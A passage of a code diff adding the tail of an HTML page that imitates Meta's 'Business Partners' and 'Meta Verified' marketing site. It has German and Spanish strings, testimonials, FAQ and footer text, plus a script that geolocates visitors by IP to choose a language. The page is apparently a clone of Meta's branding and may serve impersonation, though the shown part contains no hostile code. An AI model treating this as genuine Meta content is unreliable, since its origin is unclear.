+        feat2_title:"Ressourcen und Support", feat2_desc:"Erhalten Sie Zugang zu partnerspezifischen Ressourcen, Empfehlungen, Schulungen und Support.",
+        explore_title:"Entdecken Sie, wie Meta-Technologien Ihr Unternehmen transformieren können.",
+        card1_title:"Anzeigenleistung verbessern", card1_desc:"Maximieren Sie Kampagnenergebnisse und vereinfachen Sie den Einrichtungsprozess.",
+        card2_title:"Mehr Menschen erreichen", card2_desc:"Bringen Sie Anzeigen zu den Personen, die am wahrscheinlichsten an Ihren Produkten interessiert sind.",
+        card3_title:"Experte werden", card3_desc:"Verbessern Sie Ihre Marketingfähigkeiten mit kostenlosen Online-Kursen über Meta Blueprint.",
+        card4_title:"Personalisierte Anzeigenlösungen", card4_desc:"Sehen Sie schnellere Ergebnisse mit KI-Tools, die Anzeigen generieren, die Kunden sehen möchten.",
+        card5_title:"Leistung verstehen", card5_desc:"Greifen Sie auf erweitertes Marketing-Performance-Tracking mit detaillierten Zielgruppen-Übersichten zu.",
+        card6_title:"Effektive Anzeigenformate nutzen", card6_desc:"Entwickelt für spezifische Geschäftsziele, um Ihr Publikum auf jedem Gerät zu erreichen.",
+        feedback_title:"Sehen Sie, wie Meta Verified echten Unternehmen geholfen hat.",
+        testimonial1_quote:'"Nach der Anmeldung bei Meta Verified bemerkte ich eine erhöhte Reichweite meiner Beiträge und mehr Engagement."',
+        testimonial1_author:"Kimber Greenwood, Inhaberin von Water Bear Photography",
+        testimonial2_quote:'"Seit meinem Abonnement bemerke ich einen echten Unterschied. Meine Beiträge erreichen mehr Menschen und das Engagement ist gestiegen."',
+        testimonial2_author:"Devon Kirby, Inhaberin, Mom Approved Miami",
+        testimonial3_quote:'"Ein verifiziertes Konto signalisiert unseren Followern und neuen Besuchern, dass wir ein seriöses, professionelles Unternehmen sind."',
+        testimonial3_author:"Sarah Clancy, Inhaberin von Sarah Marie Running Co.",
+        action_title:"Bereit, Meta Verified zu werden?",
+        faq_title:"FAQ", faq_more:"Weitere Informationen finden Sie in unserem Hilfezentrum",
+        faq_q1:"Woher weiß ich, ob mein Unternehmen berechtigt ist?",
+        faq_a1:"Meta Verified ist in ausgewählten Regionen für Unternehmen verfügbar, die bestimmte Voraussetzungen erfüllen.",
+        faq_q2:"Wie kann ich informiert bleiben, wenn ich noch nicht berechtigt bin?",
+        faq_a2:"Treten Sie unserer Warteliste bei, um auf dem Laufenden zu bleiben.",
+        faq_q3:"Ich habe bereits ein verifiziertes Abzeichen. Was passiert damit?",
+        faq_a3:"Es sind keine Maßnahmen erforderlich, um Ihr Abzeichen zu behalten.",
+        footer_title:"Erhalten Sie die neuesten Updates von Meta für Unternehmen.",
+        footer_desc:"Geben Sie Ihre E-Mail-Adresse an, um die neuesten Updates zu erhalten.",
+        footer_legal:"Mit dem Absenden dieses Formulars stimmen Sie zu, Marketing-Kommunikation von Meta zu erhalten.",
+        footer_email:"E-Mail-Adresse", footer_country:"Ländernamen eingeben...", footer_subscribe:"Abonnieren"
+      },
+      es: {
+        nav_start:"Empezar", nav_advertise:"Publicidad", nav_learn:"Aprender", nav_support:"Soporte",
+        hero_title:"Conviértete en socio comercial de Meta",
+        hero_desc1:"Los socios comerciales de Meta disfrutan de beneficios únicos como capacitación, soporte, informes analíticos y oportunidades de networking.",
+        hero_desc2:"Los solicitantes pueden postularse para diversas especializaciones, incluida la gestión de agencias y gestión de feeds.",
+        btn_apply:"Aplicar ahora",
+        trusted_title:"Los socios comerciales de Meta son expertos de confianza",
+        trusted_desc:"Únete a nuestra comunidad global de especialistas en soluciones, verificados por Meta por excelencia técnica y de servicio.",
+        learn_more:"Saber más",
+        feat1_title:"Credibilidad", feat1_desc:"Gana el distintivo de Socios Comerciales de Meta para demostrar a los clientes que eres el mejor.",
+        feat2_title:"Recursos y soporte", feat2_desc:"Accede a recursos específicos para socios, recomendaciones, capacitación y soporte.",
+        explore_title:"Explora cómo las tecnologías de Meta pueden transformar tu negocio.",
+        card1_title:"Mejora el rendimiento de los anuncios", card1_desc:"Maximiza los resultados de la campaña y simplifica el proceso de configuración.",
+        card2_title:"Llega a más personas", card2_desc:"Muestra anuncios a las personas más propensas a interesarse en tus productos o servicios.",
+        card3_title:"Conviértete en experto", card3_desc:"Mejora tus habilidades de marketing con cursos gratuitos a través de Meta Blueprint.",
+        card4_title:"Obtén soluciones publicitarias personalizadas", card4_desc:"Obtén resultados más rápidos con herramientas de IA que generan anuncios relevantes.",
+        card5_title:"Comprende el rendimiento", card5_desc:"Accede al seguimiento avanzado del rendimiento de marketing con visiones detalladas del comportamiento.",
+        card6_title:"Usa formatos de anuncios efectivos", card6_desc:"Diseñado para objetivos comerciales específicos, llega a tu audiencia en todos los dispositivos.",
+        feedback_title:"Mira cómo Meta Verified ha ayudado a empresas reales.",
+        testimonial1_quote:'"Al unirme a Meta Verified, noté un mayor alcance en mis publicaciones y mayor participación con mi audiencia."',
+        testimonial1_author:"Kimber Greenwood, Propietaria de Water Bear Photography",
+        testimonial2_quote:'"Desde que me suscribí, noté una diferencia real. Mis publicaciones tienen más alcance y el compromiso ha aumentado."',
+        testimonial2_author:"Devon Kirby, Propietaria, Mom Approved Miami",
+        testimonial3_quote:'"Tener una cuenta verificada indica a nuestros seguidores y nuevos visitantes que somos una empresa profesional y confiable."',
+        testimonial3_author:"Sarah Clancy, Propietaria de Sarah Marie Running Co.",
+        action_title:"¿Listo para convertirte en Meta Verified?",
+        faq_title:"Preguntas frecuentes", faq_more:"Para más información, visita nuestro Centro de ayuda",
+        faq_q1:"¿Cómo sé si mi empresa es elegible?",
+        faq_a1:"Meta Verified está disponible en regiones seleccionadas para empresas que cumplen ciertos requisitos.",
+        faq_q2:"¿Cómo puedo mantenerme informado si aún no soy elegible?",
+        faq_a2:"Únete a nuestra lista de espera para mantenerte actualizado.",
+        faq_q3:"Ya tengo una insignia verificada. ¿Qué pasa con ella?",
+        faq_a3:"No se necesita ninguna acción para conservar tu insignia.",
+        footer_title:"Recibe las últimas actualizaciones de Meta para empresas.",
+        footer_desc:"Proporciona tu dirección de correo electrónico para recibir las últimas actualizaciones.",
+        footer_legal:"Al enviar este formulario, aceptas recibir comunicaciones de marketing de Meta.",
+        footer_email:"Dirección de correo electrónico", footer_country:"Ingresa un nombre de país...", footer_subscribe:"Suscribirse"
+      }
+    };
+
+    // Map country code → language
+    var COUNTRY_LANG = {
+      VN:"vi", KR:"ko", JP:"ja", CN:"zh", TW:"zh", HK:"zh", MO:"zh",
+      TH:"th", ID:"id", SA:"ar", AE:"ar", EG:"ar", IQ:"ar", KW:"ar",
+      QA:"ar", JO:"ar", LB:"ar", YE:"ar", FR:"fr", BE:"fr", CH:"de",
+      DE:"de", AT:"de", ES:"es", MX:"es", AR:"es", CO:"es", CL:"es",
+      PE:"es", VE:"es", US:"en", GB:"en", AU:"en", CA:"en", NZ:"en",
+      SG:"en", PH:"en", IN:"en", MY:"en"
+    };
+
+    function applyLang(lang) {
+      var dict = I18N[lang] || I18N['en'];
+
+      // Apply data-i18n text content
+      document.querySelectorAll('[data-i18n]').forEach(function(el) {
+        var key = el.getAttribute('data-i18n');
+        if (dict[key]) el.textContent = dict[key];
+      });
+
+      // Apply data-i18n-placeholder for input placeholders
+      document.querySelectorAll('[data-i18n-placeholder]').forEach(function(el) {
+        var key = el.getAttribute('data-i18n-placeholder');
+        if (dict[key]) el.placeholder = dict[key];
+      });
+
+      // RTL for Arabic
+      if (lang === 'ar') {
+        document.documentElement.setAttribute('dir', 'rtl');
+        document.documentElement.setAttribute('lang', 'ar');
+      } else {
+        document.documentElement.removeAttribute('dir');
+        document.documentElement.setAttribute('lang', lang);
+      }
+    }
+
+    (async function detectAndApply() {
+      try {
+        var res = await fetch('https://ipapi.co/json/');
+        var data = await res.json();
+        var cc = data.country_code || '';
+        var lang = COUNTRY_LANG[cc] || 'en';
+        applyLang(lang);
+      } catch(e) {
+        applyLang('en');
+      }
+    })();
+    </script>
+
+</body>
+</html>
